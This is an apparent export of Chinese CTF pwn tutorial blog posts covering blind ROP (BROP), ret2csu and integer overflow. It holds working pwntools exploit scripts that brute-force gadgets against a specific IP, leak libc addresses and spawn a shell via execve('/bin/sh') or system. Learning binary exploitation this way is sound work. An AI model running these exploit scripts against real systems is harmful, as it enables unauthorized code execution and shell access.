先来解决第一个问题：如何能找到通用gadgets（__libc_csu_init）呢？并且顺利找到pop_rdi_addr。 因为拿不到源程序，所以解决第一个问题的方法是构造相应的payload去猜测出是否某一段代码是，并且去验证，最后拿到此gadgets的地址。文章这部分开头已经提到了stop gadget，相反也有no stop gadget，两者配合即可找到通用gadgets（__libc_csu_init），进而获取我们的useful gadget，或者说我们brop gadget，用一张图形象的表述出来如何构造： 一般来说，都是64位程序，可以直接从0x400000尝试，如果不成功，有可能程序开启了PIE保护或者是32位程序，显然此题是no pie的64bit文件。从0x400000开始直到初步找到有使程序不crash的地方，这个地方有可能就是是六个pop操作（大于或者小于6个，rip就会指向p64(0)（当然你填写p64(1)，p64(2)等都可以），导致程序crash）和一个retq操作。 然后需要一步检查，如果经过一个useful gadget把上图中的addr，恰巧addr是stop gadget返回给rip中，这个useful gadget虽然符合条件，但是显然不是我们要找的brop gadget，因此需要一步检查。 此时对useful gadget进行检查，若crash，则基本上brop gadget。为了后续的代码能够有效运行，我们得先找到stop gadget，得先补一个代码，就是找到一个stop gadget，因为这是寻找其他片段的前提，在寻找的过程中可以发现stop gadgets有不少，这里挑选出来main函数的入口地址（个人强迫症，而且也没有用途，画蛇添足），给出代码：123456789101112131415161718192021def getMain(base_addr): addr = base_addr while True: payload = p64(0) * 9 + p64(addr) sh = remote(&apos;10.112.26.131&apos;, 1000) sh.recvuntil(&apos;WelCome my friend,Do you know password?\n&apos;) sh.send(payload) try: byte = sh.recv() except Exception as e: sh.close() print(&quot;[+] bad address: 0x%x&quot; % addr) addr += 1 continue c = byte.decode() print(&quot;[*] stop gadget address: 0x%x&quot; % addr) if c.startswith(&apos;WelCome my friend&apos;): print(&quot;[*] main address: 0x%x&quot; % addr) return addr addr += 1 sh.close() 运行结果：12345678910111213141516[x] Opening connection to 10.112.26.131 on port 1000[x] Opening connection to 10.112.26.131 on port 1000: Trying 10.112.26.131[+] Opening connection to 10.112.26.131 on port 1000: Done[*] Closed connection to 10.112.26.131 port 1000[+] bad address: 0x400685[x] Opening connection to 10.112.26.131 on port 1000[x] Opening connection to 10.112.26.131 on port 1000: Trying 10.112.26.131[+] Opening connection to 10.112.26.131 on port 1000: Done[*] Closed connection to 10.112.26.131 port 1000[+] bad address: 0x400686[x] Opening connection to 10.112.26.131 on port 1000[x] Opening connection to 10.112.26.131 on port 1000: Trying 10.112.26.131[+] Opening connection to 10.112.26.131 on port 1000: Done[*] stop gadget address: 0x400686[*] main address: 0x400686[Finished in 16.3s] 如果使用此代码可以在 print(“[*] stop gadget address: 0x%x” % addr)后加一句sleep(10)，获取其他的stop gadget就方便了，这里补充三个（用main真的是画蛇添足）：[*] stop gadget address: 0x40054c[*] stop gadget address: 0x40054e[*] stop gadget address: 0x40054fstop gadget的寻找代码补上了，不难理解，为了画面优美（不然除了黑就是白，太单调了）补充一副运行图 有了stop gadget那么就继续寻找brop gadget，这里给出代码：1234567891011121314151617181920212223242526def getBropGadget(base_addr, stop_gadget): addr = base_addr while True: payload = p64(0) * 9 + p64(addr) + p64(0) * 6 + p64(stop_gadget) + p64(0) * 10 try: sh = remote(&apos;10.112.26.131&apos;, 1000) sh.recvuntil(&apos;WelCome my friend,Do you know password?\n&apos;) sh.sendline(payload) sh.recvline() sh.close() print(&quot;find address: 0x%x&quot; % addr) try: payload = p64(0) * 9 + p64(addr) + p64(0) * 10 sh = remote(&apos;10.112.26.131&apos;, 1000) sh.recvline() sh.sendline(payload) sh.recvline() sh.close() print(&quot;bad address: 0x%x&quot; % addr) except: sh.close() print(&quot;final gadget address: 0x%x&quot; % addr) return addr except: sh.close() addr += 1 可以发现，find address会有不少个，所以我们检查是有必要的，这里给出final gadget address运行结果：12345678910[x] Opening connection to 10.112.26.131 on port 1000[x] Opening connection to 10.112.26.131 on port 1000: Trying 10.112.26.131[+] Opening connection to 10.112.26.131 on port 1000: Done[*] Closed connection to 10.112.26.131 port 1000find address: 0x40079a[x] Opening connection to 10.112.26.131 on port 1000[x] Opening connection to 10.112.26.131 on port 1000: Trying 10.112.26.131[+] Opening connection to 10.112.26.131 on port 1000: Done[*] Closed connection to 10.112.26.131 port 1000final gadget address: 0x40079a 这里找到了上图中popq %rbx的地址，偏移9后即popq %rdi的地址，也就是0x4007a3。1234ps：可能会对payload有些不解，这里解释一下：前面测出来栈溢出的长度是72，那么使用payload = &apos;a&apos; * 72 +，但是在此时（ payload = &apos;a&apos; * 72 + p64(addr) + p64(0) * 6 + p64(stop_gadget) + p64(0) * 10）会报错：can only concatenate str (not &quot;int&quot;) to str，由于类型不一样造成的。解决办法：直接使用payload = p64(0) * 9 + p64(addr) + p64(0) * 6 + p64(stop_gadget) + p64(0) * 10 解决第二个问题：如何获取put@got表的内容。 很眼熟的问题，在基本rop方法中学到过，具体请见上一篇文章，只要找到put()（有输出功能的函数，当然也可以write()）所在的plt表，那么在这个场景中怎么找到put@plt就是关键的一步。在上一个小问题中也说到了，只要利用stop gadget等构造合适的payload即可获取到我们想要的useful gadget。此时怎么构造呢？第一步就是先了解一下plt表，在之前的文章我们探讨过，具体详见此文章，在这里简单说一下，plt 表的一般在可执行程序开始的地方，他有一个特点就是具有比较规整的结构，每一个表项都是 16 字节，每个表项的 6 字节偏移处，是该表项对应函数的解析路径，也就是got表的位置。另外，大部分的PLT项都不会因为传进来的参数的原因crash，因为它们很多都是系统调用，都会对参数进行检查，如果有错误会返回EFAULT而已，并不会造成进程crash。所以若发现好多条连续的16个字节对齐的地址都不会造成进程crash，而且这些地址加6得到的地址也不会造成进程crash，那么很有可能这就是某个PLT对应的项了。 当然我们也可以这样，如下图： 那么contexts（过程：rdi -&gt; context_addr -&gt; contexts）就会打在荧屏上了，只需判断此条件即可获取put@plt，这里给出代码。12345678910111213141516171819def getPutPlt(base_addr, stop_gadget, pop_rdi_addr): addr = base_addr while True: payload = p64(0) * 9 + p64(pop_rdi_addr) + p64(0x400001) + p64(addr) + p64(stop_gadget) sh = remote(&apos;10.112.26.131&apos;, 1000) sh.recvuntil(&apos;WelCome my friend,Do you know password?\n&apos;) sh.send(payload) try: byte = sh.recv() except: sh.close() addr += 1 continue c = byte.decode() if c.startswith(&apos;ELF&apos;): print(&quot;[*] put@plt address: 0x%x&quot; % addr) return addr addr += 1 sh.close() 运行结果：12345[x] Opening connection to 10.112.26.131 on port 1000[x] Opening connection to 10.112.26.131 on port 1000: Trying 10.112.26.131[+] Opening connection to 10.112.26.131 on port 1000: Done[*] put@plt address: 0x400545[Finished in 11.9s] 这里需要解释一下，为什么是0x400001和startswith(‘ELF’)。首先要保证此地址在程序中是有的，然后每个程序该地址中内容都相同，因为byte.startswith(‘\x7fELF’)会报错，不如从第一位开始。下面附图一张，解释为什么是ELF，更有说服力。 有了put@plt，就像上一篇所说到的，将put@got放入rdi，即可取得put的真实地址，但是问题又来了如何找到put@got呢？当然就是这个方法的特色啦，使用put函数将plt表段给dump下来，此时还可以顺便把data表段dump下来，万一有“/bin/sh”呢。 至于地址范围可以随便找一个程序放入ida看一下。代码如下：12345678910111213141516171819def dump(base_addr, stop_gadget, pop_rdi_addr, put_plt_addr): addr = base_addr while addr &lt; 0x401000: payload = p64(0) * 9 + p64(pop_rdi_addr) + p64(addr) + p64(put_plt_addr) + p64(stop_gadget) sh = remote(&apos;10.112.26.131&apos;, 1000) sh.recvuntil(&apos;WelCome my friend,Do you know password?\n&apos;) sh.send(payload) data = sh.recv(timeout=0.1) if data == &quot;\n&quot;: data = &quot;\x00&quot; elif data[-1] == &quot;\n&quot;: data = data[:-1] if addr == 0x400000: result = data else: result += data addr += len(data) sh.close() return result puts 函数通过 \x00 进行截断，并且会在每一次输出末尾加上换行符 ，所以需要做一些处理，首先去掉末尾 puts 自动加上的 \n，然后有两种情况：一、如果 recv 到一个 \n，说明内存中是 \x00；二、如果 recv 到一个 \n\n，说明内存中是 \x0a，并且对recv进行延时。将提取出来的内容写入文件中，保存到本地，然后拖入ida中，edit-&gt;segments-&gt;rebase program 将程序的基地址改为0x400000，找到偏移0x545 （为什么是这个地址呢？因为刚才获取到了put@plt，那么根据plt表特点就知道在附近啦） ，按c进行编译成汇编语言： 成功得到put@got为0x601018，下面的泄漏出put真实地址和根据在libc中通过偏移找到system和”/bin/sh”字符串，以及最后的getshell部分就很简单啦，自认为之前的文章说的已经算详细了，具体请见初探ROP，到这里新的内容已经探讨完了。 0x03 尾记 还未入门，详细记录每个知识点，为了能更好地温故知新，也希望能帮助和我一样想要入门二进制安全的初学者，如有错误，希望大佬们指出。参考：Blind Return Oriented Programming (BROP) Attack - 攻击原理Blind Return Oriented Programming (BROP)ctfwikicanary各种姿势绕过]]></content>
      <tags>
        <tag>二进制安全</tag>
        <tag>pwn</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[再探ROP(上)]]></title>
    <url>%2F2020%2F04%2F07%2F1%2F</url>
    <content type="text"><![CDATA[毕设和论文要搞吐了，先更新一部分 0x00 前记 毕设和论文要搞吐了，再加上实习驻场事情，近期又要开始准备HW工作，只能先更新一部分 0x01 从x86到x64 之前的rop都是32bit的程序，由于这篇文章涉及的方法用于64bit的程序，这里先说一下两者的区别，做一下过渡。首先是寄存器传参和堆栈传参的区别，这里以一个例子说明 在32bit的程序中，如上图所示，在函数调用前，参数会被依次入栈；然而再64bit的同一个程序中，如下图所示，在函数调用前，参数会被放入寄存器中。两者进入函数后都会依照相应的规则去调用对应的参数，这里说一下x64寄存器使用的顺序：分别用rdi,rsi,rdx,rcx,r8,r9作为第1-6个参数。(如果参数过多会被放在栈中) 再提一个小点，虽然价值不大，对于我这种初学者来说更加深了理解，继续看 来看read函数，可以发现刚才说的一样，传参一个是栈，一个寄存器。无论是哪种方式，buf参数最终都会读到栈里面，不一样的只不过是buf的中间传递介质。详细了解请见https://blog.csdn.net/qq_29343201/article/details/51278798 0x02 ret2csu 经过一番知识铺垫，那么现在开始进入正题使用蒸米师傅的例子 12345678910111213#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123; write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13); vulnerable_function();&#125; 我们先分析一下再去验证题目的前提：1、X64程序，寄存器传参2、程序中找不到system()等可利用函数和”/bin/sh”类似的字符串3、使用ROPgadget无法找到可利用的片段，具体可以见初探ROP 中的ret2syscall章节 按照以往（上一篇文章）的手法，针对于前提2，我们使用ret2libc进行绕过，具体详见初探ROP 中的ret2libc章节的第三种情况，但是忽略了一点X64是寄存器传参，那么system()或者execve()函数的参数在寄存器保存着，那么怎么给寄存器赋予响应的值呢？很简单，类似ret2syscall手法，进行一系列出栈操作即可(达到mov的目的)，但是前提3导致我们搜索不到可利用的片段，似乎山穷水尽了，那么我们怎么办呢？这个时候就应该寻找新的利用手法，也就是ret2csu，其实就是利用&lt;__libc_csu_init&gt;，ta是在libc.so里面，一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作，可以说是通用gadgets。来看一下这个神秘的函数 1234567891011121314151617181920212223242526272829303132333435363738390000000000000760 &lt;__libc_csu_init&gt;: 760: 41 57 push %r15 762: 41 56 push %r14 764: 41 89 ff mov %edi,%r15d 767: 41 55 push %r13 769: 41 54 push %r12 76b: 4c 8d 25 56 06 20 00 lea 0x200656(%rip),%r12 772: 55 push %rbp 773: 48 8d 2d 56 06 20 00 lea 0x200656(%rip),%rbp 77a: 53 push %rbx 77b: 49 89 f6 mov %rsi,%r14 77e: 49 89 d5 mov %rdx,%r13 781: 4c 29 e5 sub %r12,%rbp 784: 48 83 ec 08 sub $0x8,%rsp 788: 48 c1 fd 03 sar $0x3,%rbp 78c: e8 e7 fd ff ff callq 578 &lt;_init&gt; 791: 48 85 ed test %rbp,%rbp 794: 74 20 je 7b6 &lt;__libc_csu_init+0x56&gt; 796: 31 db xor %ebx,%ebx 798: 0f 1f 84 00 00 00 00 nopl 0x0(%rax,%rax,1) 79f: 00 7a0: 4c 89 ea mov %r13,%rdx 7a3: 4c 89 f6 mov %r14,%rsi 7a6: 44 89 ff mov %r15d,%edi 7a9: 41 ff 14 dc callq *(%r12,%rbx,8) 7ad: 48 83 c3 01 add $0x1,%rbx 7b1: 48 39 dd cmp %rbx,%rbp 7b4: 75 ea jne 7a0 &lt;__libc_csu_init+0x40&gt; 7b6: 48 83 c4 08 add $0x8,%rsp 7ba: 5b pop %rbx 7bb: 5d pop %rbp 7bc: 41 5c pop %r12 7be: 41 5d pop %r13 7c0: 41 5e pop %r14 7c2: 41 5f pop %r15 7c4: c3 retq 7c5: 90 nop 7c6: 66 2e 0f 1f 84 00 00 nopw %cs:0x0(%rax,%rax,1) 7cd: 00 00 00 刚才巴拉巴拉了不少，这里还是得先明确一下我们使用&lt;__libc_csu_init&gt;的目的：由于寄存器传参的特性，我们需要把相应的参数值保存到相应寄存器中供后续函数进行调用，寄存器存参数的顺序为：rdi,rsi,rdx,rcx,r8,r9，所以我们使用此函数的片段来达到控制寄存器得目的。继续看此神秘函数，能改变上述寄存器的值是这几处，如下图所示： 既然有了可以控制点，那么就想办法怎么去利用？简单画一下流程，能够更好理解是怎么利用。 能够通过栈溢出得直接控制点就是几个出栈得地方，可以发现通过这几条指令可以完美的控制寄存器得值，然后通过后续程序可以间接控制参数寄存器得值。因为gadgets一般选择ret结尾得片段，这样可以达到控制程序执行的目的。这里只要将堆栈中h中值填为0x7a0，即可继续执行下一段gadgets，通过mov指令间接控制了rsi，rdx、rdi寄存器继续往下看 刚才通过控制控制rip的值使得程序从mov %r13 %rdx处继续执行，在②处对两个参数寄存器进行了传值，然后进行调用函数，由于callq指令的性质，此函数的地址根据*(%r12,%rbx,8)的值来寻找，也就是找到X的地方进行执行，之后两次ret进行控制rip寄存器，也就是继续掌控程序执行的下条指令的位置所在。通过以上分析，可以发现此ROP链能够完成一个强大的功能，那就是可以完成一个函数的调用。根据上一篇文章所提到的ret2libc的第三种利用方式，可以通过write或者put等一系列打印性质的函数读出某个函数的got表内容，从而确定libc中system或者execve等执行性质函数的位置所在，进而达到getshell的目的。当然这只是理想情况，为什么这么说呢？回到&lt;__libc_csu_init&gt;中 两个gadgets之间还有一个jne条状，也就是说如果ZF=1(%rbx==%rbp)，那么就不会跳转，按照我们刚才设计的顺序去执行。所以我们再刚才的基础上再去控制一下ZF=1即可。简单陈列一下条件：一、r13和r12寄存器中需要从栈中读到所需要参数的位置，进而可以控制rdx和rsi寄存器的值二、让rbx的值为0(当然也可以不为0，只是这样构造函数的地址方便)，那么*(%r12,%rbx,8)就成了*%r12，只需要让r12寄存器从栈中读到所需要函数的地址即可。三、为了让ZF=1，也就是rbp和rbx寄存器的值相等，既然rbx已经为0了，通过add指令到达cmp比较时它为1，因此rbp也需要为1，让rbx寄存器从栈中读取1即可。以上三个条件完成后，此ROP链配合上栈溢出漏洞就可以轻松地完成某一函数地调用过程了。其实明白了ret2csu地原理，上述地例子地做法就很灵活了，我们再来分析：一、存在栈溢出漏洞二、可以一条完成任意函数功能的ROP链三、条件二完成，我们依然可以控制程序的执行有了这三个条件，做法的灵活性就体现出来，比如可以执行完write函数泄露write的GOT表地址后再去执行main()或者_start函数继续构造栈中内容执行execve达到getshell的目的。这里使用上述方法，基础内容不再赘述，详细可以见上一篇文章(初探ROP)来了解。通过gdb调试可以计算出偏移是0x80+0x8 这里有一点还是盲区：callq *(%r12,%rbx,8)这一指令是间接调用函数，类似于它访问是一个指针，一个指向真实目的的指针。因为后续需要调用execve函数，但是我们需要提供指向其地址的指针的地址，所以用bss段的空间进行保存，如下图所示，确定堆栈上的构造 根据以上构造给出exp(个人不习惯用LibcSearcher) 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *level5 = ELF(&apos;./level5&apos;)sh = process(&apos;./level5&apos;)libc = level5.libcwrite_got = level5.got[&apos;write&apos;]read_got = level5.got[&apos;read&apos;]main_addr = level5.symbols[&apos;main&apos;]bss_base = level5.bss()csu_front_addr = 0x4005e0csu_end_addr = 0x4005fafakeebp = &apos;b&apos; * 8def csu(rbx, rbp, r12, r13, r14, r15, last): payload = &apos;a&apos; * 0x80 + fakeebp payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64( r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += &apos;a&apos; * 0x38 payload += p64(last) sh.send(payload) sleep(1)sh.recvuntil(&apos;Hello, World\n&apos;)csu(0, 1, write_got, 8, write_got, 1, main_addr)write_addr = u64(sh.recv(8))print hex(write_addr)libc.address = write_addr - libc.symbols[&apos;write&apos;]execve_addr = libc.symbols[&apos;execve&apos;]log.success(&apos;execve_addr &apos; + hex(execve_addr))sh.recvuntil(&apos;Hello, World\n&apos;)csu(0, 1, read_got, 16, bss_base, 0, main_addr)sh.send(p64(execve_addr) + &apos;/bin/sh\0&apos;)sh.recvuntil(&apos;Hello, World\n&apos;)csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)sh.interactive() 0x03 尾记 还未入门，详细记录每个知识点，为了能更好地温故知新，也希望能帮助和我一样想要入门二进制安全的初学者，如有错误，希望大佬们指出。]]></content>
      <tags>
        <tag>二进制安全</tag>
        <tag>pwn</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[不一样的整数溢出]]></title>
    <url>%2F2020%2F03%2F25%2F1%2F</url>
    <content type="text"><![CDATA[一个经常被忽视的溢出 0x01为什么会存在整数溢出 回答这个问题前，我们需要了解下整数在计算机的存储方式。在计算机中，因为二值逻辑，只有开和关（通电、断电）来表示两种状态，这刚好与”0”、”1”相对应，因此在存储单元都是以0和1来呈现，那么对于有符号数与无符号数的区别就是：以所能表示的长度的空间，它的最高位所代表的性质不同，如下图所示： 这是一个存放8个1的8bit长度的存储单元，其最高位的不同(符号位和数值位)决定了它的绝对值的不同，当然决定了其取值范围的不同。把握其中的三个关键点：一、固定长度的空间(存储单元)二、符号位和数值位三、如果运算后发生进位溢出，绿色区域的空间依旧可以用其实这样梳理以后，整数溢出的原理就随之对应而来了。 0x02 整数溢出原理 先来看一下整数溢出的危害如果我们用某个整数来表示空间的大小或者说索引，那么整数溢出可以导致堆溢出或者栈溢出，间接导致任意代码执行。可以发现，整数溢出，实际上就是程序没有按照我们正常逻辑去进行(出乎意料)，被恶意利用后就会产生危害。可以对应上述(关键点)三种情况：一、两个不同长度的储存空间进行赋值。将一个长度较长的数赋值给长度较短的空间，高位会被截断。二、有符号数与无符号数之间的转换。由于最高位的性质不同，导致各种出乎意料的状况发生。三、有(无)符号数的四则运算。比如符号相同的数就行相加，只有数值最高位或者符号位进位时，就会发生溢出；较大的无符号数的相加也会导致溢出。具体的一些细节可以参考《计算机组成原理》的计算机的运算方法。 0x03 整数溢出例子分解 知道了原理，也清楚了类型，这里就一个一个分解，个人感觉论溢出的时候，从二进制出发考虑数据类型的取值范围和溢出临界点会更容易理解。 一、截断12345678910#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char *argv[]) &#123; int a = 65536; // 0x10000 -&gt; 1 0000 0000 0000 0000 short b; b = a; printf(&quot;%d\n&quot;, b); return 0;&#125; short 为16bit（其中1位符号位），int为32bit（其中1位符号位）当把a（17bit）赋值给b时，会发生高位截断，从而b为 0000 0000 0000 0000，也就是0。再来详细看一下具体执行过程。 1234567890040152E C74424 1C 00000&gt;mov dword ptr ss:[esp+0x1C],0x10000// Stack ss:[0061FE9C]=0001000000401536 8B4424 1C mov eax,dword ptr ss:[esp+0x1C]// eax=000100000040153A 66:894424 1A mov word ptr ss:[esp+0x1A],ax// 重点来了，取eax的低16位的值放到ss:[0061FE9A]中，也就是00000040153F 0FBF4424 1A movsx eax,word ptr ss:[esp+0x1A]// eax=0000000000401544 894424 04 mov dword ptr ss:[esp+0x4],eax 可以发现，在执行的时候eax的高位被截断了，只有操作了低16位的存储的数值。 二、有(无)符号数之间的转换12345678910#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char *argv[]) &#123; unsigned short a = 32768; // 0x8000 -&gt; 1000 0000 0000 0000 short int b; b = a; printf(&quot;%d\n&quot;, b); return 0;&#125; 此时b又是多少呢？按照刚才的方法，从二进制的数入手，显然b为：1000 0000 0000 0000，虽然每一位的数没有变，但是最高位的性质变了，现在为符号位，也就是表示负数，后面15位为数值。那么此时的值是多少呢？计算机对负数是以补码的形式进行保存的，因此值为-2的15次方*1，也就是-32768。再来详细看一下具体执行过程。 1234567890040152E 66:C74424 1E 00&gt;mov word ptr ss:[esp+0x1E],0x8000// Stack ss:[0061FE9E]=800000401535 0FB74424 1E movzx eax,word ptr ss:[esp+0x1E]// eax=00080000040153A 66:894424 1C mov word ptr ss:[esp+0x1C],ax// Stack ss:[0061FE9C]=80000040153F 0FBF4424 1C movsx eax,word ptr ss:[esp+0x1C]// 可以发现两次用到了不同的指令movzx和movsx，第一个是无符号扩展，并传送，第二个带符号扩展，并传送，所以此处的eax=FFF800000401544 894424 04 mov dword ptr ss:[esp+0x4],eax 三、有(无)符号的四则运算 先来看有符号的加法 123456789#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char *argv[]) &#123; short a = 32767; // 0x7fff -&gt; 0111 1111 1111 1111 a++; printf(&quot;%d\n&quot;, a); return 0;&#125; short最大数加一后，就会变成最小数。 再来详细看一下具体执行过程。 12345678910110040152E 66:C74424 1E FF&gt;mov word ptr ss:[esp+0x1E],0x7FFF// Stack ss:[0061FE9E]=7FFF00401535 0FB74424 1E movzx eax,word ptr ss:[esp+0x1E]// eax=0007FFF0040153A 83C0 01 add eax,0x1// 执行自加，eax=0080000040153D 66:894424 1E mov word ptr ss:[esp+0x1E],ax// Stack ss:[0061FE9E]=800000401542 0FBF4424 1E movsx eax,word ptr ss:[esp+0x1E]// 使用movsx把0x8000再次放进eax中，eax=FFF800000401547 894424 04 mov dword ptr ss:[esp+0x4],eax 再来看一下无符号数，其实原理是一样的，如果说有符号数是一个坐标轴（如上图所示），那么无符号数就是一个圆盘（如下图所示），无论上溢出还是下溢出，都是围绕圆心循环转。 分析完这几个类型后，疑惑就来了，说了这么多怎么利用呢？ 0x03 实战 这里选用攻防世界的int_overflow为例进行分析拖到IDA中查看伪代码 123456789101112131415161718192021222324int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [esp+Ch] [ebp-Ch] setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); puts(&quot;---------------------&quot;); puts(&quot;~~ Welcome to CTF! ~~&quot;); puts(&quot; 1.Login &quot;); puts(&quot; 2.Exit &quot;); puts(&quot;---------------------&quot;); printf(&quot;Your choice:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v4); if ( v4 == 1 )&#123; login(); &#125; else&#123; if ( v4 == 2 )&#123; puts(&quot;Bye~&quot;); exit(0); &#125; puts(&quot;Invalid Choice!&quot;); &#125; return 0;&#125; 没有发现可疑问题，查看login()函数 123456789101112int login()&#123; char buf; // [esp+0h] [ebp-228h] char s; // [esp+200h] [ebp-28h] memset(&amp;s, 0, 0x20u); memset(&amp;buf, 0, 0x200u); puts(&quot;Please input your username:&quot;); read(0, &amp;s, 0x19u); printf(&quot;Hello %s\n&quot;, &amp;s); puts(&quot;Please input your passwd:&quot;); read(0, &amp;buf, 0x199u); return check_passwd(&amp;buf);&#125; 似乎也没什么可疑的地方，继续查看check_passwd(&amp;buf)，可以先注意下变量buf，因为他是可控的，长度为0x199 12345678910111213141516char *__cdecl check_passwd(char *s)&#123; char *result; // eax char dest; // [esp+4h] [ebp-14h] unsigned __int8 v3; // [esp+Fh] [ebp-9h] v3 = strlen(s); if ( v3 &lt;= 3u || v3 &gt; 8u ) &#123; puts(&quot;Invalid Password&quot;); result = (char *)fflush(stdout); &#125; else&#123; puts(&quot;Success&quot;); fflush(stdout); result = strcpy(&amp;dest, s); &#125; return result;&#125; 查看到这里，我们首先发现就是strcpy函数导致的栈溢出，为什么这么说呢？变量buf的长度0x199，又可以发现变量dest的位置是ebp-14h，也就是我们可以控制变量buf来控制函数的返回值，进而控制EIP的值，详细的原理和方法，可以参看走进栈溢出和初探ROP。但是问题又来了，程序用了一个if语句限制了变量buf的长度，使得我们无法达到所想的栈溢出效果，是不是就无法攻击了？回到这一篇文章的核心思想，就知道我们需要寻找整数溢出的地方。 123unsigned __int8 v3; // [esp+Fh] [ebp-9h]v3 = strlen(s);if ( v3 &lt;= 3u || v3 &gt; 8u ) &#123; 可以发现v3是一个8bit的无符号的变量，但是我们的变量buf(后面表示为s)的长度却可以达到0x199，也就是409bit的长度，这里就是我们在文章开头提到的第一种情况：将一个长度较长的数赋值给长度较短的空间，高位会被截断。如下图所示： v3的数值就是s的长度的低8位的数值，所以我们只要控制低8位的值就可以绕过if，完成后面的栈溢出攻击。继续分析，v3∈(3, 8]，化为二进制(0000 0011, 0000 1000]，那么s的长度(设为L)的低八位应该也为(0000 0011, 0000 1000]，要想既达到整数溢出的目的，又能进行栈溢出攻击，L至少有一位（大于第八位）上的数值为1，这里选取只有第九位的数值为1，即L(低九位)∈(10000 0011, 10000 1000]，也就是(259, 264],这也是整个L的长度。构造payload来获取flag，在IDA中可以找到 12345678910111213141516171819int what_is_this()&#123; return system(&quot;cat flag&quot;);&#125;对应汇编代码：.text:0804868B what_is_this proc near.text:0804868B ; __unwind &#123;.text:0804868B push ebp.text:0804868C mov ebp, esp.text:0804868E sub esp, 8.text:08048691 sub esp, 0Ch.text:08048694 push offset command ; &quot;cat flag&quot;.text:08048699 call _system.text:0804869E add esp, 10h.text:080486A1 nop.text:080486A2 leave.text:080486A3 retn.text:080486A3 ; &#125; // starts at 804868B.text:080486A3 what_is_this endp 把返回地址覆盖为0x804868B即可获取flag，构造payload 12payload = flat([&apos;a&apos; * 0x18, 0x804868B, &apos;a&apos; * 232])//像这种凑长度了使用payload = flat([&apos;a&apos; * 0x18, 0x804868B]).ljust(260,&quot;a&quot;) 可以再用gdb确认一下溢出临界，在strcpy处下断点，如下图所示，这里可以详细推敲一下(虽然意义不大，但是挺好玩的)，esp中存的是s的开始位置0xfffbbf4，ebp为0xfffbc08，可以发现是相差0x14。 其实这个elf文件的溢出临界也可以在汇编代码中找，如下图所示，有些文件会以esp+0xN来显示，因此可以用上面设置断点的方法找。 分析到这，此题也算是做完了，编写exp拿到flag即可，而且此题对整数溢出的应用更加深了。 123456789from pwn import *io = remote(&quot;111.198.29.45&quot;, 35521)cat_flag_addr = 0x0804868Bio.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;)io.sendlineafter(&quot;your username:&quot;, &quot;threepwn&quot;)payload = flat([&apos;a&apos; * 0x18, cat_flag_addr, &apos;a&apos; * 232])io.sendlineafter(&quot;your passwd:&quot;, payload)io.recv()io.interactive() 0x04 附录 借用ctfwiki的一幅图（个人感觉从二进制的数值入手会更容易理解整数溢出） 0x05 尾记 还未入门，详细记录每个知识点，为了能更好地温故知新，也希望能帮助和我一样想要入门二进制安全的初学者，如有错误，希望大佬们指出。参考：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/integeroverflow/intof-zh/]]></content>
      <tags>
        <tag>二进制安全</tag>
        <tag>pwn</tag>
        <tag>整数溢出</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初探ROP]]></title>
    <url>%2F2020%2F03%2F15%2F1%2F</url>
    <content type="text"><![CDATA[一步一步走，一点一点来，究其原因：我太菜了 0x01 前言 在了解栈溢出后，我们再从原理和方法两方面深入理解基本ROP。 0x02 什么是ROP ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。通过上一篇文章走进栈溢出，我们可以发现栈溢出的控制点是ret处，那么ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。 0x03 为什么要ROP 探究原因之前，我们先看一下什么是NX(DEP)NX即No-execute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。所以就有了各种绕过办法，rop就是一种 0x04 基本ROPret2shellcode含义 我们先看这个，顾名思义，ret to shellcode，就是将返地址覆盖到我们插入shellcode的首地址。 从原理中解析ret2shellcode 先通过一个小程序回顾一下栈溢出利用过程： 12345678910111213#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;char buf[10];int main(int arg, char **args)&#123; char s[10]; puts(&quot;start !!!&quot;); gets(s); strncpy(buf, s, 10); printf(buf); printf(&quot;\nend !!!&quot;); return 0;&#125; 可以知道s所在位置为esp+0x16，esp=0x0061FE80，那么s所在位置为61FF96，也就是ebp-0x12，因此填充18个字符即可满足溢出的临界条件 利用IDA找到buf的地址0x004053E0，在BSS段。这里普及一下是BSS段：BSS段通常是指用来存放程序中未初始化的或者初始化为0的全局变量和静态变量的一块内存区域。特点是可读写的，在程序执行之前BSS段会自动清0。既然可读写那么只要能够在栈内写入的payload，然后再转移到此处，并且执行权限就可以控制。通过strncpy函数达到这一目的 从例子中解析ret2shellcode 来看一个例子：ret2shellcode 发现利用点1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; char s; // [esp+1Ch] [ebp-64h] setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 1, 0); puts(&quot;No system for you this time !!!&quot;); gets(&amp;s); strncpy(buf2, &amp;s, 0x64u); printf(&quot;bye bye ~&quot;); return 0;&#125; 在IDA中能够发现两点：一、存在栈溢出二、能利用写入/bin/sh进行getshell 